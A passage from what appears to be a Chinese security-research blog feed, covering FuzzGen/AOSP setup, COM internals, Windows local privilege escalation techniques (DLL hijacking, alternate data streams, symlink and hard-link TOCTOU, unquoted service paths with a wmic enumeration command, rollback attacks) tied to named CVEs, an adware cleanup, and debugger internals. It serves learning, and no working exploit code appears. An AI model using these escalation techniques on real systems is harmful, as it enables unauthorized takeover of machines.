class="hljs-string">&quot;Unix Makefiles&quot;</span> ../llvm (setting parallel link <span class="hljs-built_in">jobs</span> to 1 and using the gold linker are optional but supposedly easier <span class="hljs-keyword">for</span> the RAM and shouldn<span class="hljs-string">&#x27;t use as much swap memory)</span><br><span class="hljs-string">cmake --build . (may take several hours to complete - 5-6 h in my case; setting the build type to Release should speed up the process a bit, though)</span><br><span class="hljs-string">#Build FuzzGen (Taken from the Readme and modified)</span><br><span class="hljs-string">(1. FuzzGen has already been cloned beforehand)</span><br><span class="hljs-string">2. sudo apt-get install libboost-all-dev</span><br><span class="hljs-string">3. export LLVM_DIR=/llvm-project/build (not really optional, right?; targeting other versions will fail later on; is it necessary to specify the exact build directory, that had been created while building LLVM-6.0.0?)</span><br><span class="hljs-string">4. cd FuzzGen</span><br><span class="hljs-string">5. mkdir build</span><br><span class="hljs-string">6. cd build</span><br><span class="hljs-string">7. cmake ..</span><br><span class="hljs-string">8. make -j$(nproc)</span><br></code></pre></td></tr></table></figure><p>期间有个问题，在build fuzzgen的时候可能会报错,如下</p><p><img src="image-20220226193148380.png" alt="image-20220226193148380"></p><p>打开preprocessor.h吧下面的override注释掉即可</p><p><img src="image-20220226193118645.png" alt="image-20220226193118645"></p><h1 id="AOSP"><a href="#AOSP" class="headerlink" title="AOSP"></a>AOSP</h1><p>下面是编译安卓，这边一定要注意，安卓的版本要选Android9左右的，如果编译安卓使用的clang版本与编译fuzzgen所用的不同的话，后续会报很多错。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">mkdir aosp<br><span class="hljs-built_in">cd</span> aosp<br><span class="hljs-built_in">export</span> REPO_URL=<span class="hljs-string">&#x27;https://mirrors.tuna.tsinghua.edu.cn/git/git-repo/&#x27;</span><br>git config --global user.email <span class="hljs-string">&quot;psbazx@gmail.com&quot;</span><br>git config --global user.name <span class="hljs-string">&quot;psbazx&quot;</span><br>repo init -u https://aosp.tuna.tsinghua.edu.cn/platform/manifest<br>repo init -u https://aosp.tuna.tsinghua.edu.cn/platform/manifest -b android-9.0.0_r8<br>repo sync<br></code></pre></td></tr></table></figure><p>接下去直接build即可</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">source</span> build/envsetup.sh<br></code></pre></td></tr></table></figure><p><img src="image-20220226194101560.png" alt="image-20220226194101560"></p><p>可能会报错，因为我这用的是zsh，输入 /bin/bash 换成bash即可</p><p><img src="image-20220226194214980.png" alt="image-20220226194214980"></p><p>这部分操作在你想要生成bc文件的库那加上参数即可，我这边使用的时候报了参数过多的错误</p><p><img src="image-20220226194309944.png" alt="image-20220226194309944"></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs awk">cflags: [<br>  <span class="hljs-string">&quot;-save-temps&quot;</span>,<br>  <span class="hljs-string">&quot;-emit-llvm&quot;</span>,<br>  <span class="hljs-string">&quot;-m64&quot;</span>                <span class="hljs-regexp">//</span> <span class="hljs-keyword">for</span> <span class="hljs-number">64</span> bit data layouts<br>],<br></code></pre></td></tr></table></figure><p>吧-S去除即可</p><p><img src="image-20220226194412907.png" alt="image-20220226194412907"></p><p>这一部分修改在/aosp/prebuilts/clang/host/linux-x86/下</p><p><img src="image-20220226194612287.png" alt="image-20220226194612287"></p><p>可以看到很多clang-开头的目录，一般的话都是在最后一个，当然不嫌麻烦可以把每个都改了。验证llvm版本也可以通过这边，提前看下llvm版本是不是6.0</p><p>//本人不太会安卓，纯经验</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">lunch aosp_x86_64-eng<br>make -j8<br></code></pre></td></tr></table></figure><p>喝杯咖啡坐等结束</p><p><img src="image-20220226194858828.png" alt="image-20220226194858828"></p><p>编译完后可以看到很多.bc文件在根目录下</p><p>先用llvm-link把需要的整合起来再用llvm-dis生成.ll文件即可</p><h1 id="Usage"><a href="#Usage" class="headerlink" title="Usage"></a>Usage</h1><p>生成meta文件</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">.<span class="hljs-regexp">/bin/</span>fuzzgen-preprocessor  -outfile=libvpx.meta -library-root=<span class="hljs-regexp">/home/</span>pisanbao<span class="hljs-regexp">/aosp/</span>external<span class="hljs-regexp">/libvpx/</span>libvpx<span class="hljs-regexp">/examples/</span> *.c<br></code></pre></td></tr></table></figure><p>生成fuzz stub</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">./fuzzgen <span class="hljs-attribute">-mode</span>=android <span class="hljs-attribute">-analysis</span>=deep <span class="hljs-attribute">-arch</span>=x64 -no-progressive <span class="hljs-attribute">-lib-name</span>=libvpx                   <span class="hljs-attribute">-meta</span>=libvpx.meta <span class="hljs-attribute">-consumer-dir</span>=../../../桌面/temp/123/ <span class="hljs-attribute">-lib-root</span>=~/aosp                   <span class="hljs-attribute">-path</span>=external/libvpx <span class="hljs-attribute">-outdir</span>=fuzzers/libvpx <span class="hljs-attribute">-static-libs</span>=<span class="hljs-string">&#x27;libvpx&#x27;</span>                   libvpx/consumers/libvpx.ll<br></code></pre></td></tr></table></figure><p><img src="image-20220226195550414.png" alt="image-20220226195550414"></p><p><img src="image-20220226195310211.png" alt="image-20220226195310211"></p><p>过段时间再写下fuzzgen这篇论文的读后感了。主要是想借鉴下里面生成fuzz stub这块。</p>]]></content>
    
    
    
    <tags>
      
      <tag>fuzz</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>COM</title>
    <link href="/2021/02/01/COM/"/>
    <url>/2021/02/01/COM/</url>
    
    <content type="html"><![CDATA[<p>U1S1这玩意学的特别痛苦=。=</p><p>经过好几天消化才搞懂了大概</p><p>有些地方写错了还请指正。</p><a id="more"></a><h2 id="Component-Object-Model-COM-Internals"><a href="#Component-Object-Model-COM-Internals" class="headerlink" title="Component Object Model (COM) Internals"></a>Component Object Model (COM) Internals</h2><p>COM是微软的一种开发标准，遵循这种标准开发出来的组件叫做COM组件，无论是什么语言只要遵循这种标准就能调用该组件提供的接口。<br>COM出现的原因是为了IPC（进程间通信），这种IPC之前就有叫做OLE（Object Linking and Embedding），但这不是最早的，最早的是DDE（Dynamic Data Exchange），因为这种东西比较麻烦并难以理解，所以COM被微软开发出来让其使用更加方便更容易理解。</p><p><img src="image-20210201145658375.png" alt="image-20210201145658375"></p><p>It bridge the gap between different languages and processes。</p><p>所有COM都遵循IUnknown接口标准为了解决Casting Problem</p><p><img src="image-20210202003324934.png" alt="image-20210202003324934"></p><p>主要有俩个功能，一个是引用计数，因为被不同的语言调用，还有一个是GUID，这是解决Casting Problem，因为GUID都是唯一的，name不是。</p><p><img src="image-20210202003928045.png" alt="image-20210202003928045"></p><p><img src="image-20210202003952630.png" alt="image-20210202003952630"></p><p>注册的组件再注册表中有个CLSID</p><p>这边提一下GUID,CLSID,IID,UUID</p><p>UUID是一个算法</p><p>GUID标志COM组件</p><p>CLSID标志类</p><p>IID显而易见就是接口了</p><p>其实是一个东西的不同表示</p><p><img src="image-20210202004402291.png" alt="image-20210202004402291"></p><p><img src="image-20210202004417253.png" alt="image-20210202004417253"></p><p>这边解释了客户端如何得到接口</p><p>dll中导出函数DllGetClassObject，传入Class ID，如果dll知道会返回一个factory object然后就能CoCreateInstanceEx获取接口</p><p>STA 一个对象只能由一个线程访问（通过对象的接口指针调用其方法），其他线程不得访问这个对象，因此对于这个对象的所有调用都是同步了的，对象的状态（也就是对象的成员变量的值）肯定是正确变化的，不会出现线程访问冲突而导致对象状态错误。其他线程要访问这个对象，必须等待，直到那个唯一的线程空闲时才能调用对象。</p><p><img src="image-20210202005758271.png" alt="image-20210202005758271"></p><p>MTA 一个对象可以被多个线程访问，即这个对象的代码在自己的方法中实现了线程保护，保证可以正确改变自己的状态。这对于作为业务逻辑组件或干后台服务的组件非常适合。因为作为一个分布式的服务器，同一时间可能有几千条服务请求到达，如果排队进行调用，那么将是不能想像的。</p><p><img src="image-20210202005743114.png" alt="image-20210202005743114"></p><p><img src="image-20210202102602291.png" alt="image-20210202102602291"></p><p>上图代码可以dump出在你电脑上所有可交互的对象</p><p><img src="image-20210202102807305.png" alt="image-20210202102807305"></p><p>跨进程时与前面的很像，只不过把windows messaging换成了ALPC Channel</p><p>DCOM Activator是用来管理COM对象的初始化</p><p><img src="image-20210202103048205.png" alt="image-20210202103048205"></p><p>当客户端发送请求想要创建类，他会与System Activator交互</p><p><img src="image-20210202103142612.png" alt="image-20210202103142612"></p><p>如果需要的话RPCSS会创建新的进程，如果已经存在的话就会直接使用了</p><p><img src="image-20210202103347139.png" alt="image-20210202103347139"></p><p><img src="image-20210202103359474.png" alt="image-20210202103359474"></p><p>接着就会把接口封装后返回然后客户端就能链接</p><p><img src="image-20210202103435942.png" alt="image-20210202103435942"></p><p>System Activator主要有上面俩个函数一个用来和服务端一个用来和客户端交互</p><p><img src="image-20210202104320925.png" alt="image-20210202104320925"></p><p>processhacker看句柄表的时候很常见OLE开头的ALPC PORT，这是用来定位COM对象的RPC端口的</p><p><img src="image-20210202105129205.png" alt="image-20210202105129205"></p><p><img src="image-20210202105135260.png" alt="image-20210202105135260"></p><p>上面是类似COM中的DACL</p><p>后面有些没有搞懂。。。这边就不写了，过几天深入研究下</p><h2 id="COM编写与调用"><a href="#COM编写与调用" class="headerlink" title="COM编写与调用"></a>COM编写与调用</h2><p>创建项目</p><p><img src="image-20210201151820019.png" alt="image-20210201151820019"></p><p><img src="image-20210201151930768.png" alt="image-20210201151930768"></p><p>新建项添加ATL简单对象</p><p><img src="image-20210201153910686.png" alt="image-20210201153910686"></p><p><img src="image-20210201154031617.png" alt="image-20210201154031617"></p><p>然后再temp.h中声明函数</p><p><img src="image-20210201160333368.png" alt="image-20210201160333368"></p><p>接着去cpp中实现</p><p><img src="image-20210201160357186.png" alt="image-20210201160357186"></p><p>然后定义接口</p><p><img src="image-20210201160425102.png" alt="image-20210201160425102"></p><p>直接编译，报错不需要管，进文件夹看到dll后管理员权限打开CMD输入以下命令</p><p><img src="image-20210201160057792.png" alt="image-20210201160057792"></p><p><img src="image-20210201160259922.png" alt="image-20210201160259922"></p><p>再打开工具就能看到我们注册的组件了</p><p>下面来调用我们的COM组件</p><p>首先设置属性允许跨平台语言</p><p><img src="image-20210201184050218.png" alt="image-20210201184050218"></p><p>接着添加引用，就是之前我们注册的dll</p><p><img src="image-20210201184021092.png" alt="image-20210201184021092"></p><p>接着确定namespace</p><p>查询Com组件命名空间，双击引用中需要的文件打开对象浏览器，点击带｛｝符号项，得到命名空间Namespace XXX，然后在按钮的点击事件对应代码所在的.cpp源文件中添加命名空间，如下</p><p><img src="image-20210201184419769.png" alt="image-20210201184419769"></p><p>在对象浏览器查询所需函数所在类名，然后在按钮点击事件对应代码中使用该类生成相应对象，即可调用所需函数。</p><p><img src="image-20210201185354061.png" alt="image-20210201185354061"></p><p><img src="image-20210201185729445.png" alt="image-20210201185729445"></p><p>成功</p><h2 id="COM逆向"><a href="#COM逆向" class="headerlink" title="COM逆向"></a>COM逆向</h2><p>右击点create instance</p><p><img src="image-20210201160741142.png" alt="image-20210201160741142"></p><p>接着Operations-&gt;Marshal-&gt;View Properties</p><p><img src="image-20210201160836639.png" alt="image-20210201160836639"></p><p>这边已经可以看到pid了</p><p>点view，需要配置一下dll路径，这边自行下载SDK</p><p><img src="image-20210201160944065.png" alt="image-20210201160944065"></p><p>可以看到FUCOM+0x9CC0</p><p><img src="image-20210201161156479.png" alt="image-20210201161156479"></p><p>逆向开始</p><p><img src="image-20210201161233668.png" alt="image-20210201161233668"></p><p>还有一些要配合windbg使用因为没有符号</p><p>可以windbg附加上然后命令输入</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">dqs</span> FUCOM+<span class="hljs-number">0</span>x<span class="hljs-number">9</span>CC<span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><p>类似这样</p><p><img src="image-20210201161419253.png" alt="image-20210201161419253"></p><p>把输出放到这，工具会自动帮你“融合”一波放到剪切板</p><p>然后就能还原了。</p>]]></content>
    
    
    
    <tags>
      
      <tag>windows</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>LPE基础</title>
    <link href="/2021/02/01/LPE%E5%9F%BA%E7%A1%80/"/>
    <url>/2021/02/01/LPE%E5%9F%BA%E7%A1%80/</url>
    
    <content type="html"><![CDATA[<p>国内资料太少只能摁磕英文，好在英语底子还在。</p><p>和symbolic link相关的技术在不久后windows会上通用补丁，基本可以无视了</p><p>大部分资料都是来自国外Google project zero的James Forshaw，包括工具。</p><a id="more"></a><h1 id="Introduction-to-Logical-Privilege-Escalation-on-Windows"><a href="#Introduction-to-Logical-Privilege-Escalation-on-Windows" class="headerlink" title="Introduction.to.Logical.Privilege.Escalation.on.Windows"></a>Introduction.to.Logical.Privilege.Escalation.on.Windows</h1><h2 id="Path-Canonicalization"><a href="#Path-Canonicalization" class="headerlink" title="Path Canonicalization"></a>Path Canonicalization</h2><p><img src="image-20210112191658472.png" alt="image-20210112191658472"></p><p>这种看似只能load C:\Windows\ 目录下的dll，但是可以通过”..”绕过来回退到上级目录</p><h2 id="Insecure-Path-Usage"><a href="#Insecure-Path-Usage" class="headerlink" title="Insecure Path Usage"></a>Insecure Path Usage</h2><p><img src="image-20210112192551052.png" alt="image-20210112192551052"></p><p>这种就是加了check的情况</p><p>可以通过ads附加数据流</p><p>ads实例可以参考CVE-2020-12431</p><p>可以把它当作一个文件，为一个文件或者文件夹添加ads，然后loadlib直接load我们写入的这个ads即可</p><p><img src="image-20210112193014416.png" alt="image-20210112193014416"></p><p>教材ppt写的很明确</p><h2 id="TOCTOU"><a href="#TOCTOU" class="headerlink" title="TOCTOU"></a>TOCTOU</h2><h3 id="TOCTOU-on-Name"><a href="#TOCTOU-on-Name" class="headerlink" title="TOCTOU on Name"></a>TOCTOU on Name</h3><p><img src="image-20210112201750789.png" alt="image-20210112201750789"></p><p>这个主要是利用了LoadLibrary函数的特性会添加扩展名</p><p>当然也可以通过条件竞争来打</p><p><img src="image-20210112213801439.png" alt="image-20210112213801439"></p><p>还有一种TOCTOU也是最常见的就是利用oplock和symbolic link</p><h3 id="Symbolic-Link-TOCTOU"><a href="#Symbolic-Link-TOCTOU" class="headerlink" title="Symbolic Link TOCTOU"></a>Symbolic Link TOCTOU</h3><p><img src="image-20210112214036075.png" alt="image-20210112214036075"></p><p>可以看到check了扩展名</p><p>oplock主要是为了增加条件竞争的成功概率</p><p>具体方法是创建软连接然后设置oplock，oplock触发后移除软连接并创建相同文件夹然后拷贝我们的dll进去即可</p><h2 id="DosDevices-Redirect"><a href="#DosDevices-Redirect" class="headerlink" title="DosDevices Redirect"></a>DosDevices Redirect</h2><p><img src="image-20210112220242108.png" alt="image-20210112220242108"></p><p>在学习的时候也掌握了大部分漏洞挖掘技巧</p><p>寻找攻击面-&gt;写脚本搜索-&gt;写exp</p><h2 id="HARD-LINK"><a href="#HARD-LINK" class="headerlink" title="HARD LINK"></a>HARD LINK</h2><p>CVE-2018-8440</p><p>SchRpcSetSecurity函数在win10中会检测C:\Windows\Tasks目录下是否存在后缀为.job的文件，如果存在则会写入DACL(Discretionary Access Control List,自主访问控制列表)数据。如果将job文件硬链接到特定的dll那么特定的dll就会被写入DACL数据，本来普通用户对特定的dll只具有读权限，这样就具有了写权限，接下来向dll写入漏洞利用代码并启动相应的程序就可以提权了</p><p>CVE-2018-0983 原理与其类似</p><h1 id="SANBOX"><a href="#SANBOX" class="headerlink" title="SANBOX"></a>SANBOX</h1><p>这边学习资料来自Nullcon</p><p><em>James Forshaw</em>的俩个slides</p><h2 id="The-Windows-Sandbox-Paradox"><a href="#The-Windows-Sandbox-Paradox" class="headerlink" title="The Windows Sandbox Paradox"></a>The Windows Sandbox Paradox</h2><p>这个是2015年的，当时win10还没出来着，但是原理还是很接近的，2019和这个差不多，重点讲了symbolic link但是要没了，为了方便直接放一起写了</p><p>Sandboxing Requirement</p><p>Easy to get in, hard to get out</p><p>Protects the user’s data from disclosure</p><p>Work within the limits of the OS</p><p>Sandboxed application is usable</p><p>​    Limited Performance Impact</p><p>基本上广义的sandbox就是指权限较低的，被限制了某些权限的进程，需要一些资源的时候就通过具有权限的broker process来获取，以前还以为是win10上那个像虚拟机的</p><p><img src="image-20210131220515454.png" alt="image-20210131220515454"></p><p>完整性级别一般是low，但是win10有新的ie sanbox是appcontainer</p><p><img src="image-20210131220620637.png" alt="image-20210131220620637"></p><p>上图是一般的access check，先是强制完整性校验，假如你完整性比访问程序低，你不能获取写权限</p><p>接着是owner check，这个是用来防止有人在acl中限制了owner，然后owner就不能访问自己的文件。</p><p>最后就是dacl check</p><p>但是遇到sandbox时就多加一轮</p><p><img src="image-20210131223834400.png" alt="image-20210131223834400"></p><p>微软提供了函数来让你创建一个低权限的进程，创建时会发现crash，因为进程初始化会调用一些函数来load dll，而进程没有权限</p><p><img src="image-20210131224323160.png" alt="image-20210131224323160"></p><p><img src="image-20210131224452135.png" alt="image-20210131224452135"></p><p>接下来就是讲攻击面</p><p>讲到symbolic的不介绍了。。。毕竟快没了</p><p><img src="image-20210131230751209.png" alt="image-20210131230751209"></p><p>路径规范化问题可以看前面有过介绍</p><p><img src="image-20210131230856259.png" alt="image-20210131230856259"></p><p>ads也是</p><p><img src="image-20210131231041991.png" alt="image-20210131231041991"></p><p><img src="image-20210131231056493.png" alt="image-20210131231056493"></p><p>假如申请Sharing Sections没有命名，sanbox process可以获得写权限</p><p>（可以看到申请的是writable，DuplicateHandle给了sanbox process 一个RO的memory）</p><p>这个是在chrome里发现的问题</p><p>具体就是因为没有命名导致没有安全描述符可以重新调用DuplicateHandle来获得一个可写的内存</p><p><img src="image-20210131235954558.png" alt="image-20210131235954558"></p><p><img src="image-20210201000002494.png" alt="image-20210201000002494"></p><p>如上图所示</p>]]></content>
    
    
    
    <tags>
      
      <tag>windows</tag>
      
      <tag>lpe</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>漏洞挖掘之旅</title>
    <link href="/2020/12/16/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E4%B9%8B%E6%97%85/"/>
    <url>/2020/12/16/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E4%B9%8B%E6%97%85/</url>
    
    <content type="html"><![CDATA[<p>最近小有产出，只不过厂商都不太友好不鸟人的，希望以后能挖点高质量的，这边顺带总结一波学习到的技术。</p><a id="more"></a><h1 id="windows提权总结"><a href="#windows提权总结" class="headerlink" title="windows提权总结"></a>windows提权总结</h1><h2 id="NAMEPIPE"><a href="#NAMEPIPE" class="headerlink" title="NAMEPIPE"></a>NAMEPIPE</h2><p>CVE-2020-12431</p><p>通过namepipe来影响程序一些行为从而实现LPE</p><h2 id="Incorrect-permissions-in-services"><a href="#Incorrect-permissions-in-services" class="headerlink" title="Incorrect permissions in services"></a>Incorrect permissions in services</h2><p>CVE-2019-17390</p><p>比如运行在nt system权限的服务文件夹用户可写就能替换重启服务达到提权</p><p>或者配合dll劫持等</p><h2 id="Trusted-Service-Paths"><a href="#Trusted-Service-Paths" class="headerlink" title="Trusted Service Paths"></a>Trusted Service Paths</h2><p>主要成因是由于服务文件路径没有加引号，Windows会尝试寻找并执行以空格前单词为名字的程序，操作系统会在文件路径下查找所有可能匹配项直到找到一个匹配为止。例如如下例子，Windows会尝试定位并执行如下的程序：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs \">C:\Program.exe<br>C:\Program Files\Some.exe<br>C:\Program Files\Some Folder\Service.exe<br></code></pre></td></tr></table></figure><p>具体查询方法可以用下面语句</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">wmic service get name,displayname,pathname,startmode |findstr <span class="hljs-string">/i</span> <span class="hljs-string">&quot;Auto&quot;</span> |findstr <span class="hljs-string">/i</span> <span class="hljs-string">/v</span> <span class="hljs-string">&quot;C:\Windows\\&quot;</span> |findstr <span class="hljs-string">/i</span> <span class="hljs-string">/v</span> <span class="hljs-string">&quot;&quot;</span><span class="hljs-string">&quot;</span><br></code></pre></td></tr></table></figure><p><img src="image-20201210170022069.png" alt="image-20201210170022069"></p><p>可以看到vmware一个验证程序没有引号，安装目录是我们自定义的，可以把安装目录装在一个带空格的文件夹下这样你就会发现vmware自动加上了引号233333</p><p>但是现在这种很少被认作是洞了</p><h2 id="Dll-Hijacking"><a href="#Dll-Hijacking" class="headerlink" title="Dll Hijacking"></a>Dll Hijacking</h2><p>CVE-2020-12302</p><p>dll劫持</p><h2 id="Rollback-Attack"><a href="#Rollback-Attack" class="headerlink" title="Rollback Attack"></a>Rollback Attack</h2><p>CVE-2020-15663</p><p>CVE-2019-15315</p><p>u1s1这个方法把我惊艳到了</p><p>先介绍下CVE-2019-11753，漏洞主要成因是非默认安装目录user可写//现在的软件基本都是user不可写，除了部分厂商像steam</p><p>user可写导致可以替换里面的文件，至于替换哪个就得看什么文件运行在system权限，最常见的就是更新服务，替换更新服务后检查更新即可达到提权。</p><p>一般情况下这种漏洞修复都是加个check，比如check数字签名但是没有check版本，但是该目录还是user可写，这就可以利用Rollback Attack</p><p>主要操作就是替换更新文件为以前版本的更新文件，至于是什么版本就得看哪个版本出过漏洞，然后复现一波即可。</p><h2 id="Symlink-Attack"><a href="#Symlink-Attack" class="headerlink" title="Symlink Attack"></a>Symlink Attack</h2><p>CVE-2019-14743</p><p>CVE-2019-15315</p><p>其中CVE-2019-15315也用到了rollback attack主要是绕签名，修改服务符号链接启动时以nt system权限启动cmd</p><p>CVE-2019-14743主要是权限设置不当，查看注册表SSDL显示BU是GA，procmon观察行为发现创建子健符号链接到windows installer就能修改为BU GA</p><p>这样基本能修改整个注册表权限，但为了提权就整windows installer这个服务，改成user可写后修改符号链接到cmd，然后启动服务，然后添加用户为admin即可提权</p><h2 id="RPC"><a href="#RPC" class="headerlink" title="RPC"></a>RPC</h2><p>目前无例子。。。</p><h2 id="COM"><a href="#COM" class="headerlink" title="COM"></a>COM</h2><p>听说可以fuzz。。。</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>与黑产的一次对抗</title>
    <link href="/2020/11/27/%E8%AE%B0%E5%BD%95%E4%B8%80%E6%AC%A1%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/"/>
    <url>/2020/11/27/%E8%AE%B0%E5%BD%95%E4%B8%80%E6%AC%A1%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/</url>
    
    <content type="html"><![CDATA[<p>常在河边走，哪有不湿鞋</p><a id="more"></a><h1 id="症状"><a href="#症状" class="headerlink" title="症状"></a>症状</h1><p>电脑被安上了一堆垃圾软件，什么2345浏览器，什么乱七八糟的壁纸软件wifi软件大概7 8 个</p><p>当天看到桌面弹色情小广告就开始了一波大清洗，卸载完毕很舒服，第二天开机也没啥问题</p><p>但就在第二天晚上8点，他来了。。。</p><p>装了波腾讯管家，没查出啥，就放心继续卸载过了3天也没啥大问题</p><p>但是到了第五天，没错，他又来了，看来是个狠角色迫不得已开始了一波分析</p><h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><p>当时让dalao帮我看了看猜测是装了个驱动，至于静默安装还有不断安装当初以为是计划任务但看了看没找着，回宿舍后用虚拟机+pch分析了波</p><p><img src="image-20201126235458695.png" alt="image-20201126235458695"></p><p>因为pch能看到驱动顺序嘛，病毒是某游戏修改器，因为台式机吧UAC关了一不小心双击到就给安上了</p><p>双击修改器发现有个驱动出现了</p><p>重启一波发现驱动还在</p><p><img src="image-20201126235614202.png" alt="image-20201126235614202"></p><p>那应该就是他了</p><p>跟进目录下康康</p><p><img src="image-20201126235630620.png" alt="image-20201126235630620"></p><p>所以说</p><p>鲁大师biss</p><p>天天搞这种捆绑</p><p>下一步就是摘驱动了，当然我本来以为就这？？？</p><p>第二天去台式机上一看并没有这个驱动</p><p><img src="image-20201126235830288.png" alt="image-20201126235830288"></p><p>那问题来了，他是怎么自动静默安装上去的呢？</p><p><img src="image-20201126235859122.png" alt="image-20201126235859122"></p><p>百度了波驱动名，大致了解了，开冲注册表</p><p><img src="image-20201127000058636.png" alt="image-20201127000058636"></p><p>全删光就没事了，因为注册了服务导致会自动安装</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>关于CVE-2020-12431的总结</title>
    <link href="/2020/11/27/%E5%85%B3%E4%BA%8ECVE-2020-12431%E7%9A%84%E6%80%BB%E7%BB%93/"/>
    <url>/2020/11/27/%E5%85%B3%E4%BA%8ECVE-2020-12431%E7%9A%84%E6%80%BB%E7%BB%93/</url>
    
    <content type="html"><![CDATA[<p>原文链接<a href="https://improsec.com/tech-blog/privilege-escalation-vulnerability-in-splashtop-streamer">https://improsec.com/tech-blog/privilege-escalation-vulnerability-in-splashtop-streamer</a></p><a id="more"></a><h2 id="新姿势"><a href="#新姿势" class="headerlink" title="新姿势"></a>新姿势</h2><p>和学长学了一段时间提权，总结了一波套路。。。</p><p>1.写代码”搭讪”目标</p><p>2.如果目标拒绝”搭讪”则GG否则继续</p><p>3.ida打开目标文件，查看如何处理，然后attach上去调试</p><p>再找目标的途中正巧之前一直用splashtop，就看了看，很头大，google了波发现已经被干了。</p><p>正巧复现一波学习新姿势</p><h3 id="套路总结"><a href="#套路总结" class="headerlink" title="套路总结"></a>套路总结</h3><p>作者俩个提权方法都是dll劫持，关于dll劫持就不多说了，关键是如何发现的劫持，这就需要procmon</p><p>这是我没想到的。。。以前还不知道这玩意那么好用，procmon过滤来关注进程行为，如果说load了个dll(非系统dll)即可考虑提权，下面就可以看很多比如dll的目录能否访问，不能的话康康能不能绕过</p><p>至于绕过这边又让我学到一个新姿势，就是ads，供选数据流</p><p>俩次漏洞第一次通过这个来饶过写特定扩展名，而写了个dll，第二次通过namepipe绕过设置文件权限改成设置文件夹权限达成绕过，从而配合dll劫持来达到提权</p><p>还有就是关注特定的函数SetSecurityFile</p>]]></content>
    
    
    
    <tags>
      
      <tag>windows</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>调试器学习与编写</title>
    <link href="/2020/10/16/%E8%B0%83%E8%AF%95%E5%99%A8%E5%AD%A6%E4%B9%A0%E4%B8%8E%E7%BC%96%E5%86%99/"/>
    <url>/2020/10/16/%E8%B0%83%E8%AF%95%E5%99%A8%E5%AD%A6%E4%B9%A0%E4%B8%8E%E7%BC%96%E5%86%99/</url>
    
    <content type="html"><![CDATA[<p>老早前写的东西。。。突然意识到忘记发了，成品代码不见了只有半成品<br>参考&lt;&lt;软件调试&gt;&gt;&amp;&amp;网上各大神的资料</p><a id="more"></a><p>在学习调试之前首先得明白调试得原理</p><h1 id="分析函数"><a href="#分析函数" class="headerlink" title="分析函数"></a>分析函数</h1><h2 id="DebugActiveProcess"><a href="#DebugActiveProcess" class="headerlink" title="DebugActiveProcess"></a>DebugActiveProcess</h2><p><img src="image-20201011141928644.png" alt="image-20201011141928644"></p><p>跟如__imp_DbgUiConnectToDbg</p><p><img src="image-20201011142133962.png" alt="image-20201011142133962"></p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-symbol">.text:</span>00000001800CD037                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">rcx</span>, <span class="hljs-built_in">gs</span>:<span class="hljs-number">30h</span> <span class="hljs-comment">; teb</span><br><span class="hljs-symbol">.text:</span>00000001800CD040                 <span class="hljs-keyword">add</span>     <span class="hljs-built_in">rcx</span>, <span class="hljs-number">16A8h</span><br><span class="hljs-symbol">.text:</span>00000001800CD047                 <span class="hljs-keyword">call</span>    NtCreateDebugObject<br><span class="hljs-symbol">.text:</span>00000001800CD04C                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">ecx</span>, <span class="hljs-built_in">eax</span><br></code></pre></td></tr></table></figure><p>可以看到进内核创建调试对象然后放到了teb+0x16A8处</p><p><img src="image-20201011142246830.png" alt="image-20201011142246830"></p><p>反调试方法加1</p><p><img src="image-20201011143315424.png" alt="image-20201011143315424"></p><p>继续看</p><p><img src="image-20201011150503549.png" alt="image-20201011150503549"></p><p>跟进0环</p><p><img src="image-20201011150519304.png" alt="image-20201011150519304"></p><p><img src="image-20201011151731430.png" alt="image-20201011151731430"></p><p><img src="image-20201011151858083.png" alt="image-20201011151858083"></p><p>查看如何建立联系</p><p><img src="image-20201011152527156.png" alt="image-20201011152527156"></p><p>主要是判断debugport是否为0，然后吧对象写入</p><p>所以调试大致流程是，调试器进程创建调试对象句柄放入自身teb+16A8h</p><p>然后吧调试对象地址放入被调试进程eprocess的debugport处</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p><img src="image-20201023102517762.png" alt="image-20201023102517762"></p><p>图上不是win10得，数值上有些区别但是大致原理一样</p><h1 id="调试事件的处理"><a href="#调试事件的处理" class="headerlink" 